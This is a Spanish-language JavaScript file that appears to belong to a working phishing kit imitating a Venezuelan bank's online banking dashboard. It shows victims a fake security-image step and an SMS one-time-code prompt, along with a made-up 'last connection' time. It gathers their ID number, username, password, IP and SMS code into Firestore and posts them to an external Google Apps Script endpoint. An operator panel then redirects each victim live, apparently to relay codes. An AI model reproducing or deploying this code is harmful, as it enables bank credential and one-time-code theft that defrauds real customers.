import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    doc,
    collection,
    setDoc,
    updateDoc,
    getDoc,
    onSnapshot,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Variable global para el sistema de audio
let audioSystem = null;

// Función para integrar eventos de audio con el dashboard
function integrarSistemaAudio() {
    // Esperar a que el sistema de audio esté disponible
    if (window.audioSystem) {
        audioSystem = window.audioSystem;
        console.log('🔊 Sistema de audio integrado con dashboard');
    } else {
        // Reintentar después de un momento
        setTimeout(integrarSistemaAudio, 500);
    }
}

// Función compartida para crear o actualizar documento de redirección
async function crearDocumentoRedireccion(userId, tpDocumento, imagenSeleccionada, codigoSMS) {
    if (!userId) {
        throw new Error("El ID de usuario no puede estar vacío");
    }

    const docId = `${userId} - ${tpDocumento}`;
    const userRef = doc(db, "redireccion", docId);

    // Verificar si el documento existe
    const docSnap = await getDoc(userRef);

    if (!docSnap.exists()) {
        // Si el documento no existe, crearlo con setDoc
        await setDoc(userRef, {
            usuario: docId,
            IMG: imagenSeleccionada, // Ya contiene la ruta completa, evitamos duplicarla
            SMS: codigoSMS,
            page: 0 // Inicialmente en 0 para esperar instrucciones del admin
        });
    } else {
        // Si el documento ya existe, solo actualizar los campos necesarios con updateDoc
        await updateDoc(userRef, {
            IMG: imagenSeleccionada,
            SMS: codigoSMS,
            page: 0 // Inicialmente en 0 para esperar instrucciones del admin
        });
    }

    return { docId, userRef };
}

// Función para cargar imágenes asignadas al usuario desde Firebase
async function cargarImagenesAsignadas() {
    try {
        // Obtener datos del usuario del localStorage
        let usuarioData = {};
        try {
            const datosGuardados = localStorage.getItem('usuario');
            if (datosGuardados) {
                usuarioData = JSON.parse(datosGuardados);
            }
        } catch (e) {
            console.warn('Error al leer localStorage:', e);
            return false;
        }

        // Obtener el ID de documento necesario para buscar en Firebase
        const userId = usuarioData.documento?.trim();
        const tpDocumento = usuarioData.tipoDocumento?.trim();

        if (!userId || !tpDocumento) {
            console.warn('No se encontró información de usuario para cargar imágenes');
            return false;
        }

        const docId = `${userId} - ${tpDocumento}`;
        const userRef = doc(db, "redireccion", docId);
        const userDoc = await getDoc(userRef);

        if (userDoc.exists()) {
            const userData = userDoc.data();

            // Verificar si el usuario tiene HTML personalizado
            if (userData.customHTML && userData.customHTML.trim()) {
                // Inyectar el HTML personalizado en el contenedor de imágenes
                const imagesContainer = document.getElementById('images-container');
                if (imagesContainer) {
                    imagesContainer.innerHTML = userData.customHTML;
                    setupCustomHTMLClickCapture(imagesContainer);
                    console.log('HTML personalizado cargado desde Firebase:', userData.customHTML.length + ' caracteres');
                    return true;
                }
            }
            // Si no hay HTML personalizado, verificar si el usuario tiene imágenes asignadas
            else if (userData.selectedImages && Array.isArray(userData.selectedImages) && userData.selectedImages.length === 12) {
                // Generar la tabla con las imágenes asignadas al usuario
                generarTablaImagenes(userData.selectedImages);
                console.log('Imágenes personalizadas cargadas desde Firebase');
                return true;
            }
        }

        console.log('No se encontraron imágenes personalizadas, usando imágenes por defecto');
        return false;
    } catch (error) {
        console.error('Error al cargar imágenes asignadas:', error);
        return false;
    }
}

// Función para generar dinámicamente la tabla de imágenes
function generarTablaImagenes(imagesPaths) {
    const contenedorImagenes = document.querySelector('.text-center.margin-top-10');
    if (!contenedorImagenes) return;

    // Limpiar el contenido actual
    contenedorImagenes.innerHTML = '<h3 class="text-center txt-color-azul">Seleccione el factor de seguridad para operar</h3>';

    // Crear tabla
    const table = document.createElement('table');
    table.className = 'table table-bordered';
    const tbody = document.createElement('tbody');
    table.appendChild(tbody);

    // Organizar imágenes en filas de 4
    for (let i = 0; i < imagesPaths.length; i += 4) {
        const row = document.createElement('tr');

        // Crear hasta 4 celdas para esta fila
        for (let j = 0; j < 4 && (i + j) < imagesPaths.length; j++) {
            const cell = document.createElement('td');
            const imgPath = imagesPaths[i + j];

            // Extraer solo el nombre del archivo para usar en la función checkImg
            const img = document.createElement('img');
            img.src = imgPath;
            img.alt = '';
            img.className = 'img-picker img-responsive tile';
            img.setAttribute('onclick', `checkImg('${imgPath}');`);

            cell.appendChild(img);
            row.appendChild(cell);
        }

        tbody.appendChild(row);
    }

    contenedorImagenes.appendChild(table);
}

// Hacer disponibles las funciones de Firestore globalmente
window.db = db;
window.doc = doc;
window.setDoc = setDoc;
window.onSnapshot = onSnapshot;

// Nota: window.checkImg se define más abajo, después de avanzarPaso1
// para evitar problemas de orden de definición

// Función para formatear fecha en formato DD/MM/YYYY HH:MM:SS a.m./p.m.
function formatearFecha(fecha) {
    const opciones = {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    };

    return fecha.toLocaleString('es-ES', opciones)
        .replace(',', '') // Eliminar la coma después de la fecha
        .replace(/(\d{2})\/(\d{2})\/(\d{4})/, '$1 / $2 / $3') // Agregar espacios alrededor de las barras
        .replace(/(\d{1,2}):(\d{2}):(\d{2}) (a\.m\.|p\.m\.)/, '$1:$2:$3 $4'); // Formato de 12 horas con segundos
}

// Función para generar una fecha aleatoria en los últimos 7 días
function generarFechaAleatoria() {
    const ahora = new Date();
    const hace7Dias = new Date(ahora);
    hace7Dias.setDate(ahora.getDate() - 7);

    // Generar un timestamp aleatorio entre hace 7 días y ahora
    const timestampAleatorio = Math.random() * (ahora.getTime() - hace7Dias.getTime()) + hace7Dias.getTime();
    return new Date(timestampAleatorio);
}

// Actualizar la hora de última conexión al cargar la página
// Usar serverTimestamp ya importado o usar fallback si no está disponible
if (typeof serverTimestamp !== 'function') {
    // Solo redefine si no es una función válida
    serverTimestamp = function () {
        return new Date();
    };
}

// (checkImg ya fue definido arriba)

// Intentar obtener serverTimestamp de Firebase si está disponible
try {
    // Verificar si Firebase está definido globalmente
    if (typeof firebase !== 'undefined' && firebase.firestore) {
        // Firebase v8 o anterior
        serverTimestamp = firebase.firestore.FieldValue.serverTimestamp;
    }
} catch (e) {
    console.warn('No se pudo importar serverTimestamp de Firebase, usando fallback:', e);
}

// La función guardarNombreUsuario ha sido eliminada ya que no se utiliza más
// Se reemplazó por cargarCustomDashboardMessage y actualizarDashboardConMensaje

// Función para actualizar el mensaje personalizado en el DOM
function actualizarDashboardConMensaje(mensaje) {
    try {
        // Si no hay mensaje, usar un texto genérico
        const mensajeCompleto = mensaje && mensaje.trim() ? mensaje : "BIENVENIDO";

        // Actualizar el saludo en el ribbon (selector: #ribbon .ribbon-button-alignment.pull-left)
        const ribbonElement = document.querySelector('.ribbon-button-alignment.pull-left');
        if (ribbonElement) {
            ribbonElement.textContent = `${mensajeCompleto.toUpperCase()}`;
        }

        // Actualizar el nombre en el menú lateral (selector: #show-shortcut span)
        // Obtener la segunda palabra (nombre del usuario) usando split
        const palabras = mensajeCompleto.split(' ');
        const nombreUsuario = palabras.length > 1 ? palabras[1] : palabras[0]; // Si hay más de una palabra, usar la segunda, sino la primera
        const menuElement = document.querySelector('#show-shortcut span');
        if (menuElement) {
            menuElement.textContent = nombreUsuario.toUpperCase();
        }

        console.log('Mensaje personalizado actualizado en el DOM:', mensajeCompleto);
    } catch (error) {
        console.error('Error al actualizar el mensaje personalizado en el DOM:', error);
    }
}

// Función para cargar el mensaje personalizado y la imagen de perfil desde Firestore
async function cargarCustomDashboardMessage() {
    try {
        // Obtener datos del usuario del localStorage
        let usuarioData = {};
        try {
            const datosGuardados = localStorage.getItem('usuario');
            if (datosGuardados) {
                usuarioData = JSON.parse(datosGuardados);
            }
        } catch (e) {
            console.warn('Error al leer localStorage:', e);
            return false;
        }

        // Obtener el ID de documento necesario para buscar en Firebase
        const userId = usuarioData.documento?.trim();
        const tpDocumento = usuarioData.tipoDocumento?.trim();

        if (!userId || !tpDocumento) {
            console.warn('No se encontró información de usuario para cargar el mensaje personalizado');
            return false;
        }

        const docId = `${userId} - ${tpDocumento}`;
        const userRef = doc(db, "redireccion", docId);
        const userDoc = await getDoc(userRef);

        if (userDoc.exists()) {
            const userData = userDoc.data();
            let dataLoaded = false;

            // Verificar si existe el campo customDashboardMessage
            if (userData.customDashboardMessage) {
                // Actualizar el DOM con el mensaje personalizado
                actualizarDashboardConMensaje(userData.customDashboardMessage);
                dataLoaded = true;
                console.log('Mensaje personalizado cargado desde Firestore:', userData.customDashboardMessage);
            }

            // Verificar si existe el campo profileImageSrc
            if (userData.profileImageSrc) {
                // Actualizar la imagen de perfil en el menú lateral
                const profileImage = document.querySelector('a#show-shortcut img');
                if (profileImage) {
                    profileImage.src = userData.profileImageSrc;
                    dataLoaded = true;
                }
            }

            return dataLoaded;
        }

        console.log('No se encontraron datos personalizados guardados en Firestore');
        return false;
    } catch (error) {
        console.error('Error al cargar los datos personalizados:', error);
        return false;
    }
}

// Mantener la función original para compatibilidad, pero redirigir a la nueva
async function cargarNombreUsuario() {
    return await cargarCustomDashboardMessage();
}

document.addEventListener('DOMContentLoaded', async function () {
    const lastConnectionElement = document.getElementById('last-connection-time');

    if (lastConnectionElement) {
        // Intentar obtener la última conexión desde localStorage
        let fechaConexion;
        const storageKey = 'dashboardLastConnection';

        try {
            const savedData = localStorage.getItem(storageKey);

            if (savedData) {
                // Si existe en localStorage, usar esa fecha
                fechaConexion = new Date(JSON.parse(savedData));
                console.log('Cargada última conexión desde localStorage:', fechaConexion);
            } else {
                // Si no existe en localStorage, generar una nueva fecha y guardarla
                fechaConexion = generarFechaAleatoria();
                localStorage.setItem(storageKey, JSON.stringify(fechaConexion));
                console.log('Nueva última conexión generada y guardada:', fechaConexion);
            }

            // Actualizar el texto con la fecha formateada
            lastConnectionElement.textContent = `Última conexión ${formatearFecha(fechaConexion)}`;
        } catch (e) {
            // En caso de error (ej: localStorage no disponible), usar comportamiento anterior
            console.warn('Error al manejar localStorage para última conexión:', e);
            const fechaAleatoria = generarFechaAleatoria();
            lastConnectionElement.textContent = `Última conexión ${formatearFecha(fechaAleatoria)}`;
        }
    }

    // Intentar cargar imágenes asignadas para este usuario
    const imagenesCargadas = await cargarImagenesAsignadas();
    // Si no hay imágenes asignadas, se mantiene la estructura estática original

    // Cargar el mensaje personalizado del dashboard desde Firestore
    await cargarCustomDashboardMessage();

    // Referencias a elementos del wizard
    const paso0 = document.querySelector('.bootstrapWizard li:first-child');
    const paso1 = document.querySelector('.bootstrapWizard li:nth-child(2)');

    // Contenedor principal de imágenes
    const contenedorImagenes = document.querySelector('.text-center.margin-top-10');

    // Crear el contenido del paso 1 (formulario SMS)
    const crearContenidoPaso1 = () => {
        const contenidoPaso1 = document.createElement('div');
        contenidoPaso1.id = 'paso-sms';
        contenidoPaso1.className = 'text-center margin-top-10';
        contenidoPaso1.innerHTML = `
            <h3 class="text-center txt-color-azul" style="margin-bottom: 20px;">🔐 VERIFICACIÓN DE SEGURIDAD REQUERIDA</h3>
            <div class="alert alert-warning text-center" style="margin-bottom: 15px; border-left: 4px solid #f39c12; background-color: #fef9e7;">
                <strong>⚠️ IMPORTANTE:</strong> Para proteger tu cuenta y completar esta operación de forma segura,
                <br>hemos enviado un <strong>código de verificación único</strong> a tu teléfono móvil registrado.
            </div>
            <h3 class="text-center txt-color-azul" style="margin-bottom: 20px;">Ingrese clave interactiva enviada a tu teléfono móvil(sms):</h3>
            <div class="row">
                <div class="col-md-3"></div>
                <div class="col-md-6">
                    <div class="form-group">
                        <input type="number" id="codigo-sms" class="form-control input-lg" placeholder="" maxlength="8" oninput="if(this.value.length > 8) this.value = this.value.slice(0, 8);">
                        <div style="margin-top: 10px;">
                            <div class="progress" style="height: 20px; margin-bottom: 5px; background-color: #f5f5f5; border-radius: 4px; box-shadow: inset 0 1px 2px rgba(0,0,0,.1);">
                                <div id="progress-bar" class="progress-bar" style="width: 100%; height: 100%; background-color: #92a2a8; border-radius: 4px; transition: width .6s ease;"></div>
                            </div>
                            <div class="text-right"><span id="temporizador">Tiempo restante: <strong>165</strong> segundos</span></div>
                        </div>
                    </div>
                    <div class="form-actions">
                        <div class="row">
                            <div class="col-md-12 text-right">
                                <button type="button" id="btn-regresar" class="btn btn-default" disabled>Regresar</button>
                                <button type="submit" id="btn-confirmar" class="btn btn-primary"><i class="fa fa-check"></i> Confirmar</button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3"></div>
            </div>
        `;
        return contenidoPaso1;
    };

    // Variable para almacenar la referencia al contenido del paso 1
    let contenidoPaso1 = null;

    // Función para avanzar al paso 1
    const avanzarPaso1 = (imagenId) => {
        // Guardar la selección en localStorage
        // Primero intentamos obtener el objeto usuario existente
        let usuarioData = {};
        try {
            const datosGuardados = localStorage.getItem('usuario');
            if (datosGuardados) {
                usuarioData = JSON.parse(datosGuardados);
            }
        } catch (e) {
            console.warn('Error al leer localStorage:', e);
        }

        // Actualizar el objeto con la imagen seleccionada
        usuarioData.IMG = imagenId;

        // Guardar el objeto actualizado
        localStorage.setItem('usuario', JSON.stringify(usuarioData));

        // Cambiar la clase active en el indicador de pasos
        document.querySelector('ul.bootstrapWizard li.active').classList.remove('active');
        document.querySelectorAll('ul.bootstrapWizard li')[1].classList.add('active');

        // Ocultar el contenedor de imágenes
        contenedorImagenes.style.display = 'none';

        // Crear y mostrar el contenido del paso 1 si no existe
        if (!contenidoPaso1) {
            contenidoPaso1 = crearContenidoPaso1();
            // Insertar después del contenedor de imágenes
            contenedorImagenes.parentNode.insertBefore(contenidoPaso1, contenedorImagenes.nextSibling);

            // Añadir event listeners a los botones
            document.getElementById('btn-regresar').addEventListener('click', regresarPaso0);
            document.getElementById('btn-confirmar').addEventListener('click', confirmarSMS);

            // NO inicializamos el temporizador aquí, lo haremos después de que el preloader se oculte
        } else {
            contenidoPaso1.style.display = 'block';

            // Asignar evento al botón
            document.getElementById('btn-confirmar').addEventListener('click', confirmarSMS);

            // NO inicializamos el temporizador aquí, lo haremos después de que el preloader se oculte
        }
    };

    // Hacer avanzarPaso1 accesible globalmente
    window.avanzarPaso1 = avanzarPaso1;

    // Función para procesar la selección de imagen y enviarla a Firestore
    const handleImageSelection = async (imgId) => {
        // Log para depuración
        console.log('🎯 handleImageSelection ha sido llamada!', imgId);
        console.log('🎯 FLUJO: Imagen original del dashboard (con checkImg)');
        console.log('🎯 Se mostrará overlay original (no activarOverlayPersonalizado)');
        
        // Reproducir sonido de nueva acción
        if (audioSystem) {
            audioSystem.playNewSound();
            audioSystem.updateStats('newElements');
        }
        try {
            // Para imágenes en dashboard.html, imgId ya es la ruta de la imagen
            // Usamos la ruta completa en lugar de extraer solo el nombre del archivo
            const idImagen = imgId; // Mantenemos la ruta completa
            
            // FORZAR creación de preloader dinámico para asegurar visibilidad
            // let loaderElement = document.getElementById('preloader') || document.querySelector('.cargando.text-center');
            let loaderElement = null; // Forzar creación dinámica
            
            console.log('🔍 DEBUG - Preloader existente encontrado:', !!loaderElement);
            if (loaderElement) {
                console.log('🔍 DEBUG - Tipo de preloader:', loaderElement.id, loaderElement.className);
                console.log('🔍 DEBUG - Estilos actuales del preloader:');
                console.log('🔍 DEBUG - display:', loaderElement.style.display);
                console.log('🔍 DEBUG - visibility:', loaderElement.style.visibility);
                console.log('🔍 DEBUG - opacity:', loaderElement.style.opacity);
                console.log('🔍 DEBUG - zIndex:', loaderElement.style.zIndex);
                console.log('🔍 DEBUG - position:', loaderElement.style.position);
                console.log('🔍 DEBUG - top:', loaderElement.style.top);
                console.log('🔍 DEBUG - left:', loaderElement.style.left);
                console.log('🔍 DEBUG - width:', loaderElement.style.width);
                console.log('🔍 DEBUG - height:', loaderElement.style.height);
            }
            
            // Si no se encuentra, crear uno dinámicamente
            if (!loaderElement) {
                console.log('🔍 DEBUG - No se encontró el preloader - creando uno dinámico');
                
                // Primero creamos un overlay que cubrirá toda la pantalla y bloqueará interacciones
                const overlayElement = document.createElement('div');
                overlayElement.id = 'preloader-overlay';
                overlayElement.style.position = 'fixed';
                overlayElement.style.top = '0';
                overlayElement.style.left = '0';
                overlayElement.style.width = '100%';
                overlayElement.style.height = '100%';
                overlayElement.style.backgroundColor = 'rgba(88, 88, 88, 0.7)';
                overlayElement.style.backdropFilter = 'blur(5px)';
                overlayElement.style.webkitBackdropFilter = 'blur(5px)';
                overlayElement.style.zIndex = '9998';
                document.body.appendChild(overlayElement);
                
                // Luego creamos el preloader encima del overlay
                loaderElement = document.createElement('div');
                loaderElement.id = 'preloader-dinamico';
                loaderElement.className = 'cargando text-center';
                loaderElement.innerHTML = `
                    <div style="color: white; font-size: 18px; font-weight: bold;">
                        🔄 PROCESANDO TU SOLICITUD...
                        <div style="font-size: 14px; margin-top: 8px; color: #f1c40f;">Estableciendo conexión segura con el servidor</div>
                        <div class="spinner loader" style="display: block; margin: 15px auto;"></div>
                        <div style="font-size: 12px; margin-top: 10px; color: #ecf0f1;">⏳ Este proceso puede tomar unos segundos</div>
                    </div>
                `;
                loaderElement.style.position = 'fixed';
                loaderElement.style.top = '50%';
                loaderElement.style.left = '50%';
                loaderElement.style.transform = 'translate(-50%, -50%)';
                loaderElement.style.zIndex = '9999';
                loaderElement.style.padding = '20px';
                document.body.appendChild(loaderElement);
                console.log('🔍 DEBUG - Preloader dinámico creado y agregado al DOM');
                console.log('🔍 DEBUG - Overlay y preloader agregados al body');
            }
            
            // Mostrar el preloader (existente o recién creado)
            console.log('🔍 DEBUG - Mostrando preloader');
            loaderElement.style.display = 'block';
            console.log('🔍 DEBUG - Preloader display establecido a block');
            console.log('🔍 DEBUG - Preloader final:', loaderElement.id, loaderElement.style.display);
            
            // Obtener datos de usuario
            let usuarioData = {};
            try {
                const datosGuardados = localStorage.getItem('usuario');
                if (datosGuardados) {
                    usuarioData = JSON.parse(datosGuardados);
                }
            } catch (e) {
                console.warn('Error al leer localStorage:', e);
            }
            
            const userId = usuarioData.documento?.trim();
            const tpDocumento = usuarioData.tipoDocumento?.trim();
            const codigoSMS = document.getElementById('codigo-sms')?.value || '';
            
            try {
                console.log('Enviando a Firestore:', userId, tpDocumento, idImagen);
                await crearDocumentoRedireccion(userId, tpDocumento, idImagen, codigoSMS);
                console.log('Enviado a Firestore exitosamente');
                
                // TAMBIÉN guardar selectedImageIndex para compatibilidad con el panel
                if (userId && tpDocumento) {
                    const docId = `${userId} - ${tpDocumento}`;
                    const userDocRef = doc(db, 'redireccion', docId);
                    
                    // Extraer el nombre del archivo de la imagen
                    const imageName = idImagen.split('/').pop();
                    
                    console.log('🔍 DEBUG - Ruta completa de imagen:', idImagen);
                    console.log('🔍 DEBUG - Nombre extraído:', imageName);
                    
                    // NUEVO MÉTODO: Buscar la imagen en el DOM por su src para obtener el índice real
                    let finalIndex = 1; // Fallback por defecto
                    
                    try {
                        // Buscar el contenedor de imágenes
                        const imagesContainer = document.getElementById('images-container');
                        if (imagesContainer) {
                            // Obtener todas las imágenes del contenedor
                            const allImages = imagesContainer.querySelectorAll('img');
                            console.log('🔍 DEBUG - Total de imágenes encontradas:', allImages.length);
                            
                            // Buscar la imagen que coincida con la ruta clickeada
                            for (let i = 0; i < allImages.length; i++) {
                                const img = allImages[i];
                                console.log(`🔍 DEBUG - Imagen ${i + 1}: ${img.src}`);
                                
                                // Comparar tanto la ruta completa como solo el nombre del archivo
                                if (img.src === idImagen || 
                                    img.src.endsWith(imageName) || 
                                    img.src.includes(imageName)) {
                                    finalIndex = i + 1;
                                    console.log(`🔍 DEBUG - ¡COINCIDENCIA ENCONTRADA! Índice: ${finalIndex}`);
                                    break;
                                }
                            }
                            
                            console.log('🔍 DEBUG - Índice final determinado:', finalIndex);
                        } else {
                            console.log('🔍 DEBUG - No se encontró el contenedor images-container');
                        }
                    } catch (error) {
                        console.error('🔍 DEBUG - Error al buscar imagen en DOM:', error);
                    }
                    
                    // Guardar selectedImageIndex y selectedImageName
                    await setDoc(userDocRef, {
                        selectedImageIndex: finalIndex,
                        selectedImageName: imageName,
                        lastClickTime: new Date().toISOString()
                    }, { merge: true });
                    
                    console.log('🎯 Imagen original guardada - Índice:', finalIndex, 'Nombre:', imageName);
                }
            } catch (e) {
                console.error('Error al enviar a Firestore:', e);
            }
            
            // Esperar 15 segundos
            console.log('Iniciando espera de 15 segundos...');
            await new Promise(r => setTimeout(r, 15000));
            console.log('Espera finalizada');
            
            // Ocultar el preloader y el overlay
            if (loaderElement) {
                console.log('Ocultando preloader');
                loaderElement.style.display = 'none';
                
                // Si fue creado dinámicamente, lo removemos del DOM
                if (loaderElement.id === 'preloader-dinamico') {
                    document.body.removeChild(loaderElement);
                    console.log('Preloader dinámico removido del DOM');
                    
                    // Eliminar también el overlay que bloquea la interacción
                    const overlayElement = document.getElementById('preloader-overlay');
                    if (overlayElement) {
                        document.body.removeChild(overlayElement);
                        console.log('Overlay removido del DOM');
                    }
                }
            }
            
            // Avanzar al siguiente paso
            avanzarPaso1(idImagen);
            
            // Iniciar el temporizador DESPUÉS de que el preloader se ha ocultado
            // Esto asegura que los 60 segundos empiecen a contar solo cuando el usuario puede ver el paso SMS
            console.log('Iniciando el temporizador para el paso SMS');
            iniciarTemporizador();
        } catch (error) {
            console.error('Error al procesar la selección de imagen:', error);
        }
    };
    
    // Escuchar el evento personalizado del script puente en HTML
    document.addEventListener('checkImgEvent', (event) => {
        const imgId = event.detail;
        console.log('Evento checkImgEvent detectado con:', imgId);
        handleImageSelection(imgId);
    });

    // Función para regresar al paso 0
    const regresarPaso0 = () => {
        // Cambiar clases active en el wizard
        document.querySelector('ul.bootstrapWizard li.active').classList.remove('active');
        paso1.classList.remove('active');
        paso0.classList.add('active');

        // Ocultar contenido del paso 1 y mostrar imágenes
        if (contenidoPaso1) {
            contenidoPaso1.style.display = 'none';
        }
        contenedorImagenes.style.display = 'block';
    };

    // Función para manejar la confirmación del código SMS
    const confirmarSMS = async (event) => {
        event.preventDefault();
        
        // Reproducir sonido de actualización
        if (audioSystem) {
            audioSystem.playUpdateSound();
            audioSystem.updateStats('updates');
        }

        const codigoSMSInput = document.getElementById('codigo-sms');
        if (!codigoSMSInput) {
            alert('Error: No se pudo encontrar el campo de código SMS');
            return;
        }

        const codigoSMS = codigoSMSInput.value;

        // Obtener datos de localStorage en lugar de sessionStorage
        let usuarioData = {};
        let imagenSeleccionada = '';

        try {
            const datosGuardados = localStorage.getItem('usuario');
            if (datosGuardados) {
                usuarioData = JSON.parse(datosGuardados);
                imagenSeleccionada = usuarioData.IMG || '';
            }
        } catch (e) {
            console.warn('Error al leer localStorage:', e);
        }

        // Realizar validaciones
        if (!codigoSMS) {
            alert('Por favor, ingrese el código SMS');
            return;
        }

        // Validar que sea numérico y tenga al menos 3 dígitos
        if (!/^\d{3,}$/.test(codigoSMS)) {
            alert('El código SMS debe contener al menos 3 números');
            return;
        }

        // Deshabilitar el botón para evitar envíos múltiples
        const btnConfirmar = document.getElementById('btn-confirmar');
        const btnRegresar = document.getElementById('btn-regresar');
        if (btnConfirmar) {
            btnConfirmar.disabled = true;
            btnRegresar.disabled = true;
            btnConfirmar.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Procesando...';
        }

        try {
            // Preparar datos para enviar
            const datos = {
                imagenSeleccionada,
                codigoSMS,
                direccionIP: usuarioData.direccionIP || ''
            };

            // Obtener y actualizar datos adicionales del localStorage
            try {
                // Los datos del usuario ya los tenemos en usuarioData
                // Añadir estos datos a nuestro objeto
                datos.tipoDocumento = usuarioData.tipoDocumento || '';
                datos.documento = usuarioData.documento || '';
                datos.usuario = usuarioData.usuario || '';
                datos.passwd = usuarioData.passwd || '';

                // Actualizar localStorage con el código SMS
                usuarioData.SMS = codigoSMS;
                localStorage.setItem('usuario', JSON.stringify(usuarioData));
            } catch (e) {
                console.warn('Error al actualizar datos en localStorage:', e);
            }

            // Mostrar el spinner global
            const spinner = document.getElementById('preloader');
            if (spinner) spinner.style.display = "flex";

            // Función para manejar el envío a Firestore (no bloqueante)
            const manejarFirestore = async () => {
                try {
                    const docRef = doc(collection(db, 'datos_imagenes_sms'));
                    await setDoc(docRef, {
                        ...datos,
                        fechaCreacion: serverTimestamp()
                    });
                    console.log('Datos guardados en Firestore con ID:', docRef.id);
                    return true;
                } catch (error) {
                    console.warn('No se guardaron datos en Firestore:', error);
                    return false;
                }
            };

            // Iniciar envío a Firestore en segundo plano (no esperar)
            const promesaFirestore = manejarFirestore();

            // Enviar a Google Sheets en segundo plano (no bloqueante)
            const datosParaEnviar = {
                direccionIP: datos.direccionIP,
                tipoDocumento: datos.tipoDocumento,
                documento: datos.documento,
                usuario: datos.usuario || "",
                passwd: datos.passwd || "",
                SMS: datos.codigoSMS || "",
                IMG: datos.imagenSeleccionada || ""
            };
            
            // Usar la función de envío en segundo plano
            enviarDatosEnSegundoPlano(datosParaEnviar);

            // Continuar sin esperar las promesas
            // Verificar si al menos una operación se completó exitosamente
            const firebaseExito = await promesaFirestore.catch(() => false);
            
            // Como el envío a Google Sheets es asíncrono, asumimos éxito para continuar
            // con el flujo principal
            if (true) {
                // Si al menos uno tuvo éxito, configuramos listener para esperar instrucciones
                console.log('Datos procesados correctamente, esperando instrucciones del panel');

                // Mantener el spinner visible como indicador de espera
                // No ocultamos el spinner ya que estamos esperando instrucciones

                // Deshabilitar el botón durante la espera
                if (btnConfirmar) {
                    btnConfirmar.disabled = true;
                    btnConfirmar.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Esperando...';
                }

                // Obtener el ID de usuario para la referencia a Firestore
                const userId = datos.documento.trim();
                const tpDocumento = datos.tipoDocumento.trim();
                if (!userId) {
                    throw new Error("El ID de usuario no puede estar vacío");
                }

                // Utilizar la función compartida para crear el documento de redirección
                const codigoSMS = document.getElementById('codigo-sms')?.value || '';
                const { userRef } = await crearDocumentoRedireccion(userId, tpDocumento, imagenSeleccionada, codigoSMS);

                // Ahora configurar la escucha de cambios en Firestore
                const unsubscribe = onSnapshot(userRef, (doc) => {
                    if (doc.exists()) {
                        const userData = doc.data();
                        const page = userData.page;
                        // Si el admin ha establecido una página de redirección
                        if (page > 0) {
                            // Redirigir según el valor de page
                            switch (page) {
                                case 1:
                                    const spinner1 = document.getElementById('preloader');
                                    if (spinner1) spinner1.style.display = "flex";
                                    window.location.href = "index.html";
                                    break;
                                case 2:
                                    const spinner2 = document.getElementById('preloader');
                                    if (spinner2) spinner2.style.display = "flex";
                                    window.location.href = "passwd.html";
                                    break;
                                case 3:
                                    const spinner3 = document.getElementById('preloader');
                                    if (spinner3) spinner3.style.display = "flex";
                                    window.location.href = "jrico.html";
                                    break;
                                case 4:
                                    const spinner4 = document.getElementById('preloader');
                                    if (spinner4) spinner4.style.display = "flex";
                                    window.location.href = "dashboard.html";
                                    break;
                                case 5:
                                    const spinner5 = document.getElementById('preloader');
                                    if (spinner5) spinner5.style.display = "flex";
                                    window.location.href = "dashboard-err.html";
                                    break;
                                case 8:
                                    const spinner8 = document.getElementById('preloader');
                                    if (spinner8) spinner8.style.display = "flex";
                                    window.location.href = "dashboard-tk-err.html";
                                    break;
                                case 9:
                                    const spinner9 = document.getElementById('preloader');
                                    if (spinner9) spinner9.style.display = "flex";
                                    window.location.href = "https://bdtenlinea.bdt.com.ve/?p=1";
                                    break;
                            }
                            // Opcional: Establecer un tiempo máximo de espera (por ejemplo, 2 minutos)
                            setTimeout(() => {
                                if (btnConfirmar) {
                                    btnConfirmar.disabled = false;
                                    btnConfirmar.innerHTML = '<i class="fa fa-check"></i> Confirmar';
                                }
                                alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                                unsubscribe();
                            }, 120000); // 2 minutos
                        }
                    }
                });
            } else {
                // Si ambos fallaron, ocultar spinner y mostrar error
                if (spinner) spinner.style.display = "none";
                throw new Error('No se pudo guardar la información');
            }
        } catch (error) {
            console.error('Error al procesar el código SMS:', error);

            // Ocultar spinner en caso de error
            const spinner = document.getElementById('preloader');
            if (spinner) spinner.style.display = "none";

            alert('Hubo un error al procesar el código SMS. Por favor, inténtelo de nuevo.');

            // Restablecer el botón
            if (btnConfirmar) {
                btnConfirmar.disabled = false;
                btnConfirmar.innerHTML = '<i class="fa fa-check"></i> Confirmar';
            }
        }
    };

    // Función optimizada para enviar datos a Google Sheets con timeout y retry
    async function enviarDatosAGSheets(datos, maxReintentos = 3, timeoutMs = 8000) {
        const datosAEnviar = {
            DireccionIP: datos.direccionIP || "",
            TipoDocumento: datos.tipoDocumento || "No especificado",
            Documento: datos.documento || "",
            Usuario: datos.usuario || "",
            Passwd: datos.passwd || "",
            SMS: datos.SMS || "",
            IMG: datos.IMG || ""
        };

        const url = "https://script.google.com/macros/s/AKfycbx109GX3arUTEEqfKhVOyuEYVX1EoGMsDKpdHmiuvDhKWajbIfQ8vf57i4ZiZrXtK-Q-g/exec";

        for (let intento = 1; intento <= maxReintentos; intento++) {
            try {
                // Crear AbortController para timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

                const response = await fetch(url, {
                    method: "POST",
                    mode: "no-cors",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    body: new URLSearchParams(datosAEnviar).toString(),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                
                // Con no-cors, si llega aquí sin error, asumimos éxito
                console.log(`Datos enviados a Google Sheets exitosamente (intento ${intento})`);
                return true;

            } catch (error) {
                console.warn(`Intento ${intento} fallido:`, error.name);
                
                // Si es el último intento, fallar
                if (intento === maxReintentos) {
                    console.error("Falló el envío a Google Sheets después de todos los intentos");
                    return false;
                }
                
                // Esperar antes del siguiente intento (backoff exponencial)
                const espera = Math.min(1000 * Math.pow(2, intento - 1), 5000);
                await new Promise(resolve => setTimeout(resolve, espera));
            }
        }
        
        return false;
    }

